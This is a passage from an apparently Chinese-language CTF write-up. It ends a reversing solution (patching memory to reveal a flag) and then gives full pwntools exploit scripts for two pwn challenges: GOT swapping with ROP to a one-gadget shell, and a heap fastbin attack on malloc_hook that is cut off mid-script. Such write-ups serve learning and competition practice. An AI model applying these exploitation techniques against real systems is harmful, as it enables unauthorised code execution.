        v28 = sub_410960(ciphernimstr_6152C8, player_cards_packages_6152C0);
        ending = sub_40E170(ending, *v28);
        memcpy((char *)ending + *ending + 16, v28 + 2, *v28 + 1);
        *ending += *v28;
    LABEL_20:
        v26 = (const char *)(ending + 2);
      }
      else
      {
        if ( v24 )
          goto LABEL_20;
        v26 = (const char *)&unk_410C84;
      }
如果你手里的牌是他要的，ending这个最终输出会和sub_410960这里的加密结果合并（字符串加），并打印出来，后面的分析基于我们在程序运行过程中patch了手牌
sub_410960会调用tea_like_410800进行xxtea加密，通过调试发现，这个函数的两个参数，不随着我们开头输入的name而改变（应该就是sub_410960的两个参数，当时太困了，没有考证），即输入输出全部来自程序本身，值得注意的是0x6152c8这个nim数组来自于另一个常量异或加密0x20（NimMainModule_402010、ciphermaybe_4113A0），这样的话我们将这段内存patch成它的异或0x20结果
手牌和初始密文都被patch后，直接运行binary，程序会在游戏结束时为我们输出解密了的flag
## Swap Return | Pwn
  1. 把printf和atoi交换以后可以leak出stack的地址，
  2. 通过partialoverwrite来覆盖setvbuf来得到gets的地址。
  3. 把stack_check_failed改成ret
  4. 把atoi换成gets
  5. ROP
    from pwn import *
    local=1
    pc='/tmp/pwn/swap_returns_debug'
    remote_addr="swap.chal.ctf.westerns.tokyo"
    remote_port=37567
    aslr=False
    libc=ELF('./libc.so.6')
    #libc=ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
    #libc=ELF('/lib/i386-linux-gnu/libc-2.23.so')
    #context.log_level=True
    if local==1:
        p = process(pc,aslr=aslr,env={'LD_PRELOAD': './libc.so.6'})
        gdb.attach(p,'c')
    else:
        p=remote(remote_addr,remote_port)
    ru = lambda x : p.recvuntil(x)
    sn = lambda x : p.send(x)
    rl = lambda   : p.recvline()
    sl = lambda x : p.sendline(x) 
    rv = lambda x : p.recv(x)
    sa = lambda a,b : p.sendafter(a,b)
    sla = lambda a,b : p.sendlineafter(a,b)
    def lg(s,addr):
        print('33[1;31;40m%20s-->0x%x33[0m'%(s,addr))
    def raddr(a=6):
        if(a==0):
            return u64(rv(a).ljust(8,'x00'))
        else:
            return u64(rl().strip('n').ljust(8,'x00'))
    def set_addr(addr1,addr2):
        sla("choice:",'1')
        sla("address:",str(addr1))
        sla("address:",str(addr2))
    def sw():
        sla("choice:",'2')
    fuck=0x601500
    save=0x601700
    zero=0x601800
    def make_byte(bt):
        global fuck
        global save
        global zero
        i=0
        for k in range(len(bt)):
            byte=u8(bt[i])
            set_addr(fuck+byte,stack_addr)
            sw()
            set_addr(fuck+byte+1,zero)
            sw() 
            set_addr(fuck+byte,save+i)
            sw() 
            i+=1
            zero+=8
    if __name__ == '__main__':
        sla("choice:",'9')
        rl()
        atoi=0x601050
        printf=0x0601038
        stack_check_failed=0x601030
        setvbuf=0x601048
        bss=0x601100
        set_addr(atoi,printf)
        sw()
        sa("choice:",'%x')
        rv(8)
        stack_addr=int('7fff'+rv(8),16)-6+0x30
        lg('stack_addr',stack_addr)
        sa("choice:",'ax00')
        sla("address:",str(atoi))
        sla("address:",str(printf))
        sa("choice:",'aa')
        set_addr(bss,setvbuf)
        sw()
        set_addr(bss+0x100,stack_check_failed)
        sw()
        make_byte(p16(0x6ff0))
        set_addr(bss-6,save-6)
        sw()
        make_byte(p16(0x8e8))
        set_addr(bss+0x100-6,save-6)
        sw()
        set_addr(bss+0x100,stack_check_failed)
        sw()
        puts_plt=0x4006A0
        poprdiret=0x0400a53
        puts_got=0x601028
        poprbpret=0x0000000000400760
        leaveret=0x4008E7
        payload='A'*22+p64(poprbpret)+p64(save-8)+p64(leaveret)
        payload2=p64(poprdiret)+p64(puts_got)+p64(puts_plt)+p64(0x40088E)
        make_byte(payload2)
        set_addr(bss,atoi)
        sw()
        sla("choice:",payload)
        ru(": n")
        puts_addr=raddr(6)
        lg("puts addr",puts_addr)
        libc.address=puts_addr-libc.symbols['puts']
        one_shot=libc.address+0x4557a
        sl(cyclic(20)+p64(one_shot))
        p.interactive()
## BBQ| Pwn
逻辑很简单，主要是在eat函数有一个ptr未初始化的bug  
所以利用步骤是
  1. 利用ptr未初始化leak出堆地址。然后结合buy的输入，可以做到任意地址free
  2. 伪造一个fake的non-fastbin chunk，free，leak出libc的地址
  3. 在malloc_hook附件伪造一个0x21的size
  4. 在main_arean那里伪造一个Food struct，使得food的amount对于fastbin[0]的fd，这样我们就可以通过修改amount来让fastbin的fd指向malloc_hook伪造0x21处
  5. fastbin attack来修改malloc_hook，再用one gadget
英文版的wp可以访问
    from pwn import *
    local=0
    pc='/tmp/pwn/BBQ_debug'
    remote_addr="pwn1.chal.ctf.westerns.tokyo"
    remote_port=21638
    aslr=True
    libc=ELF('./libc.so.6')
    #libc=ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
    #libc=ELF('/lib/i386-linux-gnu/libc-2.23.so')
    context.log_level=True
    if local==1:
        #p = process(pc,aslr=aslr)
        p = process(pc,aslr=aslr,env={'LD_PRELOAD': './libc.so.6'})
        gdb.attach(p,'c')
    else:
        p=remote(remote_addr,remote_port)
    ru = lambda x : p.recvuntil(x)
    sn = lambda x : p.send(x)
    rl = lambda   : p.recvline()
    sl = lambda x : p.sendline(x) 
    rv = lambda x : p.recv(x)
    sa = lambda a,b : p.sendafter(a,b)
    sla = lambda a,b : p.sendlineafter(a,b)
    def lg(s,addr):
        print('33[1;31;40m%20s-->0x%x33[0m'%(s,addr))
    def raddr(a=6):
        if(a!=0):
            return u64(rv(a).ljust(8,'x00'))
        else:
            return u64(rl().strip('n').ljust(8,'x00'))
    def choice(idx):
        sla("Choice: ",str(idx))
    def buy(name,amount):
        choice(1)
        sla(">> ",name)
        sla(">> ",str(amount))
    def grill(name,idx):
        choice(2)
        sla(">> ",name)
        sla(">> ",str(idx))
    def eat(idx):
        choice(3)
        sla(">> ",str(idx))
    if __name__ == '__main__':
        name='x'*0x10+p64(0xDEADBEEF11)[:5]
        buy('A'*(62-0x20),123)
        buy(p64(0xDEADBEEF11),0xe1)
        buy(name,123)
        grill(name,0)
        grill(name,1)
        eat(0)
        eat(1)
        buy('C'*39,123)
        eat(5)
        choice(1)
        ru("* ")
        ru("* ")
        heap_addr=raddr(6)-0x110
        lg("heap_addr",heap_addr)
        sla(">> ","Beef")
        sla(">> ",str(1))
        buy('C'*40+p64(heap_addr+0xb0),123)
        eat(5)
        buy(p64(heap_addr+0xd0),123)
        choice(1)
        ru("121")
        ru("* ")
        libc_addr=raddr(6)-0x3c4b78
        libc.address=libc_addr
        lg("Libc address",libc_addr)
        sla(">> ","Beef")
        sla(">> ",str(1))
        # create a 0x21 above malloc hook
        buy(p64(libc.symbols['__malloc_hook']-0x18),123)
        choice(1)
        k=ru('food na').split(' ')